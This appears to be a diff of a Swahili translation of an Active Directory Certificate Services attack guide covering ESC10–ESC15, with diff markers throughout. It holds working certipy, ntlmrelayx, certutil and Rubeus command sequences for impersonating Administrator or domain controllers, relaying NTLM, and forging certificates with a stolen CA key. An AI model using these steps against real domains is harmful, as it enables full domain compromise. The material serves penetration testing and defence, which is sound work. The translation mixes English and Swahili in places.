+**Kesi 1**
 
-Wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `0`.
+Wakati `StrongCertificateBindingEnforcement` imewekwa kama `0`.
 
-### Kesi 2
+**Kesi 2**
 
 Ikiwa `CertificateMappingMethods` inajumuisha bit ya `UPN` (`0x4`).
 
-### Mfano wa Unyonyaji 1
+### Mfano wa Matumizi Mabaya 1
 
-Wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `0`, akaunti A yenye ruhusa za `GenericWrite` inaweza kutumiwa kuweka hatarini akaunti yoyote B.
+Ikiwa `StrongCertificateBindingEnforcement` imewekwa kama `0`, akaunti A yenye ruhusa za `GenericWrite` inaweza kutumiwa ili compromise akaunti yoyote B.
 
-Kwa mfano, kwa kuwa na ruhusa za `GenericWrite` juu ya `Jane@corp.local`, mdukuaji analenga kuharibu `Administrator@corp.local`. Taratibu zinafanana na ESC9, zikiruhusu kutumia template yoyote ya certificate.
+Kwa mfano, akiwa na ruhusa za `GenericWrite` juu ya `Jane@corp.local`, mshambuliaji analenga compromise `Administrator@corp.local`. Utaratibu unaendana na ESC9, ukiruhusu any certificate template kutumika.
 
-Hapo mwanzoni, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, ikitumia ruhusa za `GenericWrite`.
+Mwanzo, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, ikitumia `GenericWrite`.
 ```bash
 certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
 ```
-Baadaye, `userPrincipalName` ya `Jane` imebadilishwa kuwa `Administrator`, kwa makusudi kuondoa sehemu ya `@corp.local` ili kuepuka uvunjaji wa vigezo.
+Baadaye, `Jane`'s `userPrincipalName` inabadilishwa kuwa `Administrator`, kwa makusudi kuondoa sehemu ya `@corp.local` ili kuepuka ukiukaji wa vigezo.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
 ```
@@ -528,19 +530,19 @@ Baada ya hili, cheti kinachowezesha uthibitishaji wa mteja kinaombwa kwa jina la
 ```bash
 certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```
-Kisha `userPrincipalName` ya `Jane` inarudishwa kwenye hali yake ya awali, `Jane@corp.local`.
+`userPrincipalName` ya `Jane` kisha inarudishwa kwa thamani yake ya awali, `Jane@corp.local`.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
 ```
-Kuthibitisha kwa cheti kilichopatikana kutatoa NT hash ya `Administrator@corp.local`, hivyo kunahitajika kubainisha domain kwenye amri kutokana na ukosefu wa taarifa za domain kwenye cheti.
+Kuthibitisha kwa kutumia certificate iliyopatikana kutatoa NT hash ya `Administrator@corp.local`, hivyo lazima utaje domain kwenye amri kwa sababu certificate haina maelezo ya domain.
 ```bash
 certipy auth -pfx administrator.pfx -domain corp.local
 ```
-### Kesi ya Matumizi Mabaya 2
+### Kesi ya Matumizi Mbaya 2
 
-Kwa kuwa `CertificateMappingMethods` ina `UPN` bit flag (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza compromise akaunti yoyote B isiyokuwa na mali ya `userPrincipalName`, ikiwemo machine accounts na built-in domain administrator `Administrator`.
+Ikiwa `CertificateMappingMethods` ina flag ya bit ya `UPN` (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza kupata udhibiti wa akaunti yoyote B isiyo na mali ya `userPrincipalName`, ikiwa ni pamoja na akaunti za mashine na msimamizi wa domain aliyejengwa ndani `Administrator`.
 
-Hapa, lengo ni compromise `DC$@corp.local`, kuanzia kwa kupata hash ya `Jane` kupitia Shadow Credentials, kwa kutumia `GenericWrite`.
+Hapa, lengo ni kupata udhibiti wa `DC$@corp.local`, kuanza kwa kupata hash ya `Jane` kupitia Shadow Credentials, kwa kutumia `GenericWrite`.
 ```bash
 certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
 ```
@@ -548,31 +550,31 @@ certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
 ```
-Cheti cha uthibitishaji wa mteja kimeombwa kama `Jane` kwa kutumia kiolezo chaguo-msingi cha `User`.
+Cheti kwa ajili ya uthibitisho wa mteja kimeombwa kama `Jane` kwa kutumia kiolezo la chaguo-msingi `User`.
 ```bash
 certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
 ```
-`userPrincipalName` ya `Jane` inarudishwa kwenye thamani yake ya asili baada ya mchakato huu.
+`userPrincipalName` ya `Jane` inarudishwa kwenye hali yake ya awali baada ya mchakato huu.
 ```bash
 certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
 ```
-Ili kuthibitisha kupitia Schannel, chaguo `-ldap-shell` la Certipy linatumiwa, likionyesha mafanikio ya uthibitishaji kama `u:CORP\DC$`.
+Ili kuthibitisha kupitia Schannel, chaguo la Certipy `-ldap-shell` linatumika, likionyesha mafanikio ya uthibitishaji kama `u:CORP\DC$`.
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-Kupitia LDAP shell, amri kama `set_rbcd` zinaweza kuwezesha Resource-Based Constrained Delegation (RBCD) attacks, na zinaweza kuhatarisha domain controller.
+Kupitia LDAP shell, amri kama `set_rbcd` zinawezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), na zinaweza kuhatarisha usalama wa domain controller.
 ```bash
 certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 ```
-Udhaifu huu pia unahusisha akaunti yoyote ya mtumiaji isiyo na `userPrincipalName` au ambapo haifananishi na `sAMAccountName`. Akaunti ya chaguo-msingi `Administrator@corp.local` ni lengo kuu kutokana na vibali vyake vilivyoongezeka vya LDAP na ukosefu wa `userPrincipalName` kwa chaguo-msingi.
+Uraha huu pia unahusisha akaunti yoyote ya mtumiaji isiyokuwa na `userPrincipalName` au ambapo haifananishi na `sAMAccountName`, huku `Administrator@corp.local` ya chaguo-msingi ikiwa lengwa kuu kutokana na vibali vyake vya LDAP vilivyo juu na ukosefu wa `userPrincipalName` kwa chaguo-msingi.
 
 ## Relaying NTLM to ICPR - ESC11
 
-### Explanation
+### Maelezo
 
-Ikiwa CA Server haijasanidiwa na `IF_ENFORCEENCRYPTICERTREQUEST`, inaweza kuruhusu NTLM relay attacks bila kusaini kupitia RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
+Ikiwa CA Server haijasanidiwa na `IF_ENFORCEENCRYPTICERTREQUEST`, inaweza kuwezesha mashambulizi ya relay ya NTLM bila kusaini kupitia huduma ya RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
 
-Unaweza kutumia `certipy` kugundua ikiwa `Enforce Encryption for Requests` imezimwa na certipy itaonyesha udhaifu wa `ESC11`.
+Unaweza kutumia `certipy` kuorodhesha ikiwa `Enforce Encryption for Requests` imezimwa na certipy itaonyesha `ESC11` Vulnerabilities.
 ```bash
 $ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
@@ -589,7 +591,7 @@ Enforce Encryption for Requests     : Disabled
 ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
 
 ```
-### Senario ya Matumizi Mabaya
+### Abuse Scenario
 
 Inahitaji kusanidi relay server:
 ```bash
@@ -610,29 +612,29 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
-Kumbuka: Kwa domain controllers, lazima taja `-template` katika DomainController.
+Kumbuka: Kwa domain controllers, tunapaswa kubainisha `-template` katika DomainController.
 
-Au tumia [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
+Au kutumia [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
 ```bash
 $ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
 ```
-## Shell access to ADCS CA with YubiHSM - ESC12
+## Ufikiaji wa shell kwa ADCS CA na YubiHSM - ESC12
 
-### Explanation
+### Maelezo
 
-Wasimamizi wanaweza kusanidi Certificate Authority ili kuihifadhi kwenye kifaa cha nje kama "Yubico YubiHSM2".
+Wasimamizi wanaweza kusanidi Mamlaka ya Cheti (Certificate Authority) ili kuihifadhi kwenye kifaa cha nje kama "Yubico YubiHSM2".
 
-Ikiwa kifaa cha USB kimeunganishwa kwenye server ya CA kupitia bandari ya USB, au kupitia USB device server pale server ya CA ikiwa virtual machine, ufunguo wa uthibitishaji (sometimes referred to as a "password") unahitajika kwa Key Storage Provider ili kuzalisha na kutumia keys ndani ya YubiHSM.
+If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.
 
-Ufunguo/password huu umehifadhiwa kwenye registry chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` kwa cleartext.
+Hili funguo/"password" limehifadhiwa kwenye registry chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` kwa maandishi wazi.
 
 Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).
 
-### Abuse Scenario
+### Muktadha wa Matumizi Mabaya
 
-Ikiwa private key ya CA imehifadhiwa kwenye kifaa cha kimwili cha USB na wewe umepata shell access, inawezekana kutrecover key hiyo.
+If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.
 
-Kwanza, unahitaji kupata certificate ya CA (hii ni public) na kisha:
+Kwanza, unahitaji kupata cheti cha CA (hiki ni cha umma) kisha:
 ```cmd
 # import it to the user store with CA certificate
 $ certutil -addstore -user my <CA certificate file>
@@ -640,17 +642,17 @@ $ certutil -addstore -user my <CA certificate file>
 # Associated with the private key in the YubiHSM2 device
 $ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
 ```
-Hatimaye, tumia amri certutil `-sign` kutengeneza cheti kipya chochote kwa kutumia cheti cha CA na funguo lake binafsi.
+Mwishowe, tumia amri ya certutil `-sign` kutengeneza cheti kipya chochote kwa kutumia cheti cha CA na ufunguo wake wa kibinafsi.
 
 ## OID Group Link Abuse - ESC13
 
 ### Maelezo
 
-Sifa ya `msPKI-Certificate-Policy` inaruhusu sera ya utoaji kuongezwa kwenye template ya cheti. Vitu vya `msPKI-Enterprise-Oid` vinavyowajibika kwa utoaji wa sera vinaweza kugunduliwa katika Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) ya PKI OID container. Sera inaweza kuunganishwa na AD group kwa kutumia sifa ya kitu hiki `msDS-OIDToGroupLink`, ikiruhusu mfumo kuidhinisha mtumiaji anayeonyesha cheti kana kwamba alikuwa mwanachama wa group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
+The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Marejeo hapa](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
 
-Kwa maneno mengine, mtumiaji akiokuwa na ruhusa ya ku-enroll cheti na cheti hicho kikiwa kimeunganishwa na OID group, mtumiaji anaweza kurithi haki za group hiyo.
+Kwa maneno mengine, mtumiaji akiwa na ruhusa ya kusajili cheti na cheti hicho kikiwa kimeunganishwa na kundi la OID, mtumiaji anaweza kurithi ruhusa za kundi hilo.
 
-Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kugundua OIDToGroupLink:
+Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kutafuta OIDToGroupLink:
 ```bash
 Enumerating OIDs
 ------------------------
@@ -672,49 +674,49 @@ OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.139243
 OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 ------------------------
 ```
-### Abuse Scenario
+### Senario ya Matumizi Mabaya
 
-Tafuta ruhusa ya mtumiaji; unaweza kutumia `certipy find` au `Certify.exe find /showAllPermissions`.
+Tafuta ruhusa ya mtumiaji kwa kutumia `certipy find` au `Certify.exe find /showAllPermissions`.
 
-Iwapo `John` ana ruhusa ya kujiandikisha kwa `VulnerableTemplate`, mtumiaji anaweza kurithi ruhusa za kikundi `VulnerableGroup`.
+Ikiwa `John` ana ruhusa ya kujiandikisha kwenye `VulnerableTemplate`, mtumiaji anaweza kurithi haki za kikundi `VulnerableGroup`.
 
-Yote anachohitaji kufanya ni kutaja kiolezo, atapata cheti chenye haki za OIDToGroupLink.
+Yote inahitaji kufanya ni kutaja template; mtumiaji atapata cheti chenye haki za OIDToGroupLink.
 ```bash
 certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
 ```
-## Usanidi dhaifu wa Urejeshaji wa Vyeti - ESC14
+## Mipangilio Dhaifu ya Upyaji wa Cheti - ESC14
 
 ### Maelezo
 
-Maelezo katika https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ni ya kina sana. Hapa chini ni nukuu ya maandishi ya asili.
+Maelezo katika https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ni ya kina sana. Hapa chini ni nukuu ya maandishi ya awali.
 
-ESC14 inashughulikia nyufa zinazotokana na "weak explicit certificate mapping", hasa kupitia matumizi mabaya au usanidi usio salama wa sifa ya `altSecurityIdentities` kwenye akaunti za mtumiaji au kompyuta za Active Directory. Sifa hii yenye thamani nyingi inaruhusu wasimamizi kuhusisha kwa mkono vyeti vya X.509 na akaunti ya AD kwa madhumuni ya uthibitishaji. Inapojaa, ulinganifu huu wazi unaweza kubadilisha mantiki ya kimsingi ya ulinganifu wa vyeti, ambayo kawaida hutegemea UPNs au majina ya DNS katika SAN ya cheti, au SID iliyojengwa ndani ya ugani wa usalama `szOID_NTDS_CA_SECURITY_EXT`.
+ESC14 inashughulikia udhaifu unaotokana na "weak explicit certificate mapping", hasa kupitia matumizi mabaya au usanidi usio salama wa sifa ya `altSecurityIdentities` kwenye akaunti za watumiaji au kompyuta za Active Directory. Sifa hii yenye thamani nyingi inaruhusu wasimamizi kuhusisha kwa mikono vyeti vya X.509 na akaunti ya AD kwa madhumuni ya uthibitishaji. Wakati imejazwa, ramani hizi za wazi zinaweza kuimarisha mantiki ya ramani ya chaguo-msingi ya cheti, ambayo kawaida hutegemea UPNs au majina ya DNS kwenye SAN ya cheti, au SID iliyowekwa ndani ya nyongeza ya usalama `szOID_NTDS_CA_SECURITY_EXT`.
 
-Ulinganifu "dhaifu" hutokea pale thamani ya string inayotumika ndani ya sifa `altSecurityIdentities` kutambua cheti ni ya upana sana, rahisi kukisia, inaanzia kwenye nyanja za cheti zisizo za kipekee, au inatumia vipengele vya cheti ambavyo ni rahisi kuiga. Ikiwa mshambuliaji anaweza kupata au kutengeneza cheti ambacho sifa zake zinaendana na ulinganifu uliofafanuliwa vibaya kwa akaunti yenye ruhusa, wanaweza kutumia cheti hicho kuthibitisha na kuigiza akaunti hiyo.
+"Ramani dhaifu" hutokea pale thamani ya kamba inayotumiwa ndani ya sifa ya `altSecurityIdentities` kutambua cheti ni pana mno, rahisi kukisia, inategemea mashamba yasiyo ya kipekee ya cheti, au inatumia vipengele vya cheti vinavyoweza kuiga kwa urahisi. Ikiwa mshambuliaji anaweza kupata au kutengeneza cheti ambacho sifa zake zinakidhi ramani iliyofafanuliwa vibaya kwa akaunti yenye hadhi ya juu, anaweza kutumia cheti hicho kuthibitisha na kujisifu kuwa ni akaunti hiyo.
 
-Mifano ya nyuzi za ulinganifu za `altSecurityIdentities` zinazoweza kuwa dhaifu ni pamoja na:
+Mifano ya kamba za ramani za `altSecurityIdentities` zinazoweza kuwa dhaifu ni pamoja na:
 
-- Kulinganisha kwa kutumia tu Subject Common Name (CN) ya kawaida: mfano, `X509:<S>CN=SomeUser`. Mshambuliaji anaweza kupata cheti chenye CN hii kutoka kwa chanzo kisicho salama.
-- Kutumia Issuer Distinguished Names (DNs) au Subject DNs ambazo ni za jumla sana bila sifa za ziada kama nambari maalum ya serial au subject key identifier: mfano, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
-- Kutumia mifumo mingine inayoweza kutabirika au vitambulisho visivyo vya kriptografia ambavyo mshambuliaji anaweza kutosheleza katika cheti anachoweza kupata kwa halali au kutengeneza (ikiwa wamevamia CA au wamegundua template dhaifu kama ilivyo katika ESC1).
+- Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. Mshambuliaji anaweza kupata cheti chenye CN hii kutoka kwa chanzo chenye usalama mdogo.
+- Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
+- Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).
 
-Sifa ya `altSecurityIdentities` inaunga mkono miundo mbalimbali ya ulinganifu, kama:
+Sifa ya `altSecurityIdentities` inaunga mkono fomati mbalimbali za ramani, kama vile:
 
-- `X509:<I>IssuerDN<S>SubjectDN` (inalinganisha kwa Issuer na Subject DN kamili)
-- `X509:<SKI>SubjectKeyIdentifier` (inalinganisha kwa thamani ya ugani wa Subject Key Identifier wa cheti)
-- `X509:<SR>SerialNumberBackedByIssuerDN` (inalinganisha kwa nambari ya serial, kwa mtazamo inafafanuliwa kwa Implicit na Issuer DN) - hii si muundo wa kawaida, kawaida ni `<I>IssuerDN<SR>SerialNumber`.
-- `X509:<RFC822>EmailAddress` (inalinganisha kwa jina la RFC822, kawaida anwani ya barua pepe, kutoka SAN)
-- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (inalinganisha kwa hash ya SHA1 ya public key ghafi ya cheti - kwa ujumla imara)
+- `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
+- `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
+- `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
+- `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
+- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)
 
-Usalama wa ulinganifu huu unategemea kwa kiasi kikubwa utofauti, kipekee, na nguvu za kriptografia za vitambulisho vya cheti vilivyotumika katika string ya ulinganifu. Hata kwa kuweka modes imara za certificate binding kwenye Domain Controllers (ambazo kwa msingi zinaathiri ulinganifu wa implicit unaotegemea SAN UPNs/DNS na ugani wa SID), kipengele cha `altSecurityIdentities` kilichosanifiwa vibaya bado kinaweza kutoa njia ya moja kwa moja ya kuigiza akaunti ikiwa mantiki ya ulinganifu yenyewe imeharibika au ni yenye kupitisha sana.
+Usalama wa ramani hizi unategemea sana ufafanuzi, upekee, na nguvu ya kimsingi ya kriptografia ya kitambulisho cha cheti kilichochaguliwa katika kamba ya ramani. Hata pale hatua kali za kufunga cheti zinapowashwa kwenye Domain Controllers (ambazo hasa zinaathiri ramani zisizo wazi zenye msingi kwenye SAN UPNs/DNS na nyongeza ya SID), kipengele cha `altSecurityIdentities` kilicho sanidiwa vibaya bado kinaweza kutoa njia ya moja kwa moja ya kujisifu ikiwa mantiki ya ramani yenyewe ni dhaifu au mpana kupita kiasi.
 
-### Hali ya Matumizi Mabaya
+### Skenario ya Matumizi Mabaya
 
-ESC14 inalenga **explicit certificate mappings** katika Active Directory (AD), hasa sifa ya `altSecurityIdentities`. Ikiwa sifa hii imewekwa (kwa kusudi au kwa usanidi mbaya), washambuliaji wanaweza kuigiza akaunti kwa kuwasilisha vyeti vinavyolingana na ulinganifu.
+ESC14 inalenga **explicit certificate mappings** katika Active Directory (AD), hasa sifa ya `altSecurityIdentities`. Ikiwa sifa hii imewekwa (kulingana na muundo au kutokana na usanidi mbaya), washambuliaji wanaweza kujisifu kwa akaunti kwa kuonyesha vyeti vinavyolingana na ramani.
 
-#### Scenario A: Mshambuliaji Anaweza Kuandika kwenye `altSecurityIdentities`
+#### Skenario A: Mshambuliaji Anaweza Kuandika kwenye `altSecurityIdentities`
 
-**Masharti ya awali**: Mshambuliaji ana ruhusa za kuandika kwenye sifa ya `altSecurityIdentities` ya akaunti lengwa au ruhusa ya kuipa katika moja ya ruhusa zifuatazo kwenye kituo cha AD lengwa:
+**Masharti ya awali**: Mshambuliaji ana ruhusa ya kuandika kwenye sifa ya `altSecurityIdentities` ya akaunti lengwa au ruhusa ya kuipatia kwa njia ya mojawapo ya ruhusa zifuatazo kwenye kitu lengwa cha AD:
 - Write property `altSecurityIdentities`
 - Write property `Public-Information`
 - Write property (all)
@@ -724,21 +726,21 @@ ESC14 inalenga **explicit certificate mappings** katika Active Directory (AD), h
 - `GenericAll`
 - Owner*.
 
-#### Scenario B: Lengo Lina Ulinganifu Dhaifu kupitia X509RFC822 (Barua pepe)
+#### Skenario B: Lengo Lina Ramani Dhaifu kupitia X509RFC822 (Email)
 
-- **Masharti ya awali**: Lengo lina ulinganifu dhaifu wa X509RFC822 katika altSecurityIdentities. Mshambuliaji anaweza kuweka sifa ya mail ya mwathirika ili ifanane na jina la X509RFC822 la lengo, kusajili/kuomba cheti kama mwathirika, na kukitumia kuthibitisha kama lengo.
+- **Masharti ya awali**: Lengo lina ramani dhaifu ya X509RFC822 katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa ya barua (`mail`) ya mwathirika ili iendane na jina la X509RFC822 la lengo, kujiandikisha cheti kama mwathirika, kisha kutumia cheti hicho kuthibitisha kama lengo.
 
-#### Scenario C: Lengo Lina Ulinganifu X509IssuerSubject
+#### Skenario C: Lengo Lina X509IssuerSubject Mapping
 
-- **Masharti ya awali**: Lengo lina ulinganifu wazi dhaifu wa X509IssuerSubject katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa za `cn` au `dNSHostName` kwenye principal ya mwathirika ili zifananane na subject ya ulinganifu wa X509IssuerSubject wa lengo. Kisha, mshambuliaji anaweza kusajili cheti kama mwathirika, na kutumia cheti hicho kuthibitisha kama lengo.
+- **Masharti ya awali**: Lengo lina ramani dhaifu ya X509IssuerSubject iliyo wazi katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa ya `cn` au `dNSHostName` kwenye msimamizi wa mwathirika ili iendane na subject ya ramani ya X509IssuerSubject ya lengo. Kisha, mshambuliaji anaweza kujiandikisha cheti kama mwathirika, na kutumia cheti hicho kuthibitisha kama lengo.
 
-#### Scenario D: Lengo Lina Ulinganifu X509SubjectOnly
+#### Skenario D: Lengo Lina X509SubjectOnly Mapping
 
-- **Masharti ya awali**: Lengo lina ulinganifu wazi dhaifu wa X509SubjectOnly katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa za `cn` au `dNSHostName` kwenye principal ya mwathirika ili zifananane na subject ya ulinganifu wa X509SubjectOnly wa lengo. Kisha, mshambuliaji anaweza kusajili cheti kama mwathirika, na kutumia cheti hicho kuthibitisha kama lengo.
+- **Masharti ya awali**: Lengo lina ramani dhaifu ya X509SubjectOnly iliyo wazi katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa ya `cn` au `dNSHostName` kwenye msimamizi wa mwathirika ili iendane na subject ya ramani ya X509SubjectOnly ya lengo. Kisha, mshambuliaji anaweza kujiandikisha cheti kama mwathirika, na kutumia cheti hicho kuthibitisha kama lengo.
 
-### Operesheni halisi
+### Operesheni za Vitendo
 
-#### Scenario A
+#### Skenario A
 
 Omba cheti kwa kutumia template ya cheti `Machine`
 ```bash
@@ -748,7 +750,7 @@ Hifadhi na ubadilishe cheti
 ```bash
 certutil -MergePFX .\esc13.pem .\esc13.pfx
 ```
-Thibitisha (kwa kutumia cheti)
+Thibitisha (ukitumia cheti)
 ```bash
 .\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
 ```
@@ -756,28 +758,27 @@ Usafishaji (hiari)
 ```bash
 Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
 ```
-Kwa njia za mashambulizi maalum katika matukio mbalimbali ya mashambulizi, tafadhali rejea yafuatayo: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).
+Kwa mbinu maalum zaidi za mashambulizi katika matukio mbalimbali ya shambulizi, rejea yafuatayo: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).
 
-## EKUwu Application Policies(CVE-2024-49019) - ESC15
+## EKUwu Sera za Maombi(CVE-2024-49019) - ESC15
 
 ### Maelezo
 
-Maelezo kwenye https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ni ya kina sana. Hapa chini ni nukuu ya maandishi ya asili.
+Maelezo kwenye https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ni ya kina sana. Chini ni nukuu ya maandishi ya asili.
 
-Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template
+Kwa kutumia template za vyeti za chaguo-msingi zinazojengwa za toleo 1, mshambuliaji anaweza kutengeneza CSR ili kujumuisha application policies ambazo zinapendekezwa zaidi kuliko configured Extended Key Usage attributes zilizobainishwa kwenye template. Sharti pekee ni enrollment rights, na inaweza kutumika kuunda client authentication, certificate request agent, na codesigning certificates kwa kutumia template ya **_WebServer_**.
 
-### Matumizi mabaya
+### Abuse
 
-The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.
+Mafuatayo yanarejea [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu), Bonyeza kuona mbinu za matumizi za kina.
 
-
-Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
+Amri ya Certipy's `find` inaweza kusaidia kutambua V1 templates ambazo zinaweza kuwa nyeti kwa ESC15 ikiwa CA haijarekebishwa.
 ```bash
 certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
 ```
-#### Senario A: Kuiga Moja kwa Moja kupitia Schannel
+#### Senario A: Kuiga moja kwa moja kupitia Schannel
 
-**Hatua 1: Omba cheti, ukiingiza "Client Authentication" Application Policy na UPN ya lengo.** Mshambuliaji `attacker@corp.local` analenga `administrator@corp.local` akitumia template ya "WebServer" V1 (ambayo inaruhusu enrollee-supplied subject).
+**Hatua 1: Omba cheti, ukiingiza "Client Authentication" Application Policy na UPN lengwa.** Mshambulizi `attacker@corp.local` analenga `administrator@corp.local` akitumia template ya "WebServer" V1 (ambayo inaruhusu subject inayotolewa na aliyejisajili).
 ```bash
 certipy req \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
@@ -787,16 +788,16 @@ certipy req \
 -application-policies 'Client Authentication'
 ```
 - `-template 'WebServer'`: Template dhaifu ya V1 yenye "Enrollee supplies subject".
-- `-application-policies 'Client Authentication'`: Inaingiza OID `1.3.6.1.5.5.7.3.2` katika extension ya Application Policies ya CSR.
-- `-upn 'administrator@corp.local'`: Inaweka UPN katika SAN kwa ajili ya kuiga.
+- `-application-policies 'Client Authentication'`: Hufyonza OID `1.3.6.1.5.5.7.3.2` kwenye extension ya Application Policies ya CSR.
+- `-upn 'administrator@corp.local'`: Inaweka UPN katika SAN kwa ajili ya impersonation.
 
-**Hatua ya 2: Thibitisha kupitia Schannel (LDAPS) ukitumia cheti kilichopatikana.**
+**Hatua ya 2: Thibitisha kwa Schannel (LDAPS) ukitumia cheti kilichopatikana.**
 ```bash
 certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
 ```
-#### Senario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse
+#### Mfano B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse
 
-**Hatua 1: Omba cheti kutoka kwa template ya V1 (with "Enrollee supplies subject"), ukiongeza "Certificate Request Agent" Application Policy.** Cheti hiki ni kwa ajili ya attacker (`attacker@corp.local`) ili awe enrollment agent. Hakuna UPN imeainishwa kwa utambulisho wa mshambuliaji hapa, kwani lengo ni uwezo wa enrollment agent.
